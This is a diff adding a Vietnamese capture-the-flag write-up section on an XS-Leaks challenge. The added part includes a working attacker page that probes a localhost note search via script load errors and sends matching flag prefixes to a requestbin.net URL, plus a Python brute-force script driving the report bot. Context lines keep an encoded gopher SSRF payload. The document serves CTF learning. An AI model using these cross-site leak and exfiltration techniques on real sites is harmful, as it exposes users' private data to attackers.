@@ -114,14 +114,164 @@ Dùng session_key đó để tạo 1 cookie set `user=admin` là có flag:
 
 FLAG; `KCSC{1_just_l34rn_h0w_t0_t3l3p0rt_t0_y0u_<3}`
 
+## Leak me if you can
 
- ## Client-side Check
+### Description:
+
+Khi vào web và thử hết cac chức năng một hồi thì biết được web có chức năng tạo note và lưu trữ và server, có thể xem lại và có 1 trang report để report link cho server. Tiếp tục đọc qua source thì thấy có web còn 1 chức năng nữa đó là tìm kiếm bằng query LIKE của SQL.
+
+## Solutin
+
+Sau khi end giải thì mình hỏi các người anh em xã hội của mình thì biết được trang web bị dính `XS Leaks`. Các bạn có thể tham khảo tại đây để biết thêm về `XS Leaks`.
+
+Khi đã biết trang web bị lỗi gì rồi thì đi vào đọc source để xem chúng ta có thể khai thác ở đâu được.
+
+Source thì mình đã link ở trên đầu rồi.
+
+Sau một hồi đọc hết các file của source thì mình thấy có 1 chỗ có thể khai thác được đó là ở path `/notes/search`:
+
+```javascript
+router.get('/notes/search', (req, res) => {
+	if(req.query.note) {
+		const query = `${req.query.note}%`;
+		return db.findNote(query, isAdmin(req))
+			.then(notes => {
+				if(notes.length == 0) return res.status(404).send(response('No  results!'));
+				res.json(notes);
+			})
+			.catch(() => res.send(response('Something went wrong! Please try again!')));
+	}
+	return res.status(403).json(response('Missing "note" parameters!'));
+});
+```
+
+Server sẽ lấy value của query note mình truyền vào xong rồi tiếp tục cho vào hàm findNote để có thể tìm kiếm trên database. Nếu thấy sẽ trả về note đó và nếu không thấy thfi trả về 404 (mọi người để ý đoạn này).
+
+Function `findNote`:
+```javascript
+async findNote(query, is_admin=0) {
+        return new Promise(async (resolve, reject) => {
+            try {
+                let stmt = await this.db.prepare("SELECT * FROM notes WHERE note like ? AND is_admin = ?");
+                console.log(stmt.all(query, is_admin));
+                console.log(is_admin);
+                resolve(await stmt.all(query, is_admin));
+            } catch(e) {
+                console.log(e);
+                reject(e);
+            }
+        });
+    }
+```
+
+Như mình đã nói ở trên thì server dùng like để tìm kiếm note. Chúng ta có thể thực hiện các câu tìm kiếm ví dụ như này: `/notes/search?note=12%` để tìm các note có bắt đầu bằng `12`. Vậy khai thác kiểu gì ? Thì trong hàm `find_note` có arg là `is_admin` mà `is_admin` sẽ bằng 1 khi mà mình truy cập từ localhost(cái này ở mấy dòng code trên sẽ thấy). Khi mà `is_admin=1` thì sẽ tìm được các note chứa flag. 
+
+Vector tấn công sẽ như sau: Truy cập vào localhost (dựa vào chức năng report) -> Tìm từng kí tự của Flag -> Gửi về -> Get flag -> DONE
+
+Đầu tiên mình đã thử cách gửi trực tiếp url tìm flag lên server nhưng kết quả chỉ trả về `Your submission is now pending review!`. Chả thu được gì nên mình đã nghĩ ra cách là tạo 1 cái web có chức năng check url tìm note gửi lên server, nếu status trả về 200 thì là đúng còn trả về 404 thì là sai.
+
+Để hiểu hơn thì mình để code web mình ở đây:
+
+`app.js`:
+```javascript
+let express = require('express');
+let app = express();
+
+app.get('/home', function(req, res) {
+    res.sendFile(__dirname + '/home.html');
+});
+
+let port = 5050;
+let server = app.listen(port);
+console.log('Local server running on port: ' + port);
+```
+
+`home.html`
+
+```
+<script>
+    function checkError(url) {
+        let script = document.createElement('script')
+        script.src = url
+        // Check url nếu không lỗi (status 200) thì sẽ gửi về request bin để lấy flag
+        script.onload = () => window.open("http://requestbin.net/r/f86y55ir/flag=" + url);
+        // Ngược lại thì chả làm gì cả
+        script.onerror = () => console.log(url);
+        document.head.appendChild(script)
+    }   
+</script>
+
+<script>
+    let urlParams = new URLSearchParams(window.location.search);
+    let paramChar = urlParams.get("c");
+    let paramFlag = urlParams.get("flag");
+    paramChar = Number(paramChar);
+    // Check 5 request để đỡ tốn time vì author cho time của bot là 7s thì phait
+    checkError("http://localhost:13337/notes/search?note=" + paramFlag + String.fromCharCode(paramChar) + "%");
+    checkError("http://localhost:13337/notes/search?note=" + paramFlag + String.fromCharCode(paramChar - 1) + "%");
+    checkError("http://localhost:13337/notes/search?note=" + paramFlag + String.fromCharCode(paramChar - 2) + "%");
+    checkError("http://localhost:13337/notes/search?note=" + paramFlag + String.fromCharCode(paramChar - 3) + "%");
+    checkError("http://localhost:13337/notes/search?note=" + paramFlag + String.fromCharCode(paramChar - 4) + "%");
+</script>
+
+```
+Sau khi đã tạo được server của mình rồi thì cần sử dụng ngrok để có thể truy cập được web đó.
+
+Xong hết tất cả ta đến với script cuối cùng:
+
+
+```python
+import requests
+import string
+
+CHARS = string.printable
+url = "http://localhost:20101/report"
+
+# URL server ngrock của bạn
+urlReport = "https://1346-14-171-124-200.ngrok.io/home?flag={}&c={}"
+
+def report(flag):
+    for i in range(127, 32, -5):
+        payload = urlReport.format(flag, str(i))
+        res = requests.post(url, data={
+            "url": payload,
+        })
+        print(payload)
+        res = requests.get("http://requestbin.net/r/f86y55ir?inspect").text
+        for char in range(i, i - 5, -1):
+            if flag + chr(char) in res:
+                flag = flag + chr(char)
+                print(flag)
+                return flag
+
+def main():
+    FLAG = "KCSC{"
+    while True:
+        if "}" in FLAG:
+            break
+        FLAG = report(FLAG)
+    
+if __name__ == "__main__":
+    main()
+    
+```
+
+Script này có chức năng brute force các ký tự của flag và check flag.
+
+Chạy một lúc thì có được flag:
+
+![image](https://user-images.githubusercontent.com/96786536/166224460-df950fae-8e07-4bfb-8e5a-6986155d5233.png)
+
+Vì là build trên local nên mình không lấy được flag.
+
+
+## Client-side Check
  
- ### Description:
+### Description:
  
- 1 trang web có chức năng nhập vào 1 số, check nếu số đó trùng với lucky number thì sẽ có flag, còn không có thì sẽ in ra các dòng khác nhau.
+1 trang web có chức năng nhập vào 1 số, check nếu số đó trùng với lucky number thì sẽ có flag, còn không có thì sẽ in ra các dòng khác nhau.
  
- ### Solution:
+### Solution:
 
 Vì tên của bài là `Client-side Check` nên mình sẽ thực hiện check source ở phía client xem có gì không.
 
@@ -383,4 +533,4 @@ Pyload get flag: `%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%3
 
 FLAG: `KCSC{Make_HTTP_Request_With_Gopher}`
 
-Nếu mình giải thêm được bài nào nữa mình sẽ update tại đây nha. Cảm ơn mọi người đã đón đọc.
+Cảm ơn mọi người đã đọc đến đây :))). Nếu có bất kỳ thắc mắc gì mọi người có thể liên hệ với mình qua fb ở trên profile hoặc discord `5h4s1#5262`. Cảm ơn mọi người, chúc mọi người một ngày tốt lành.
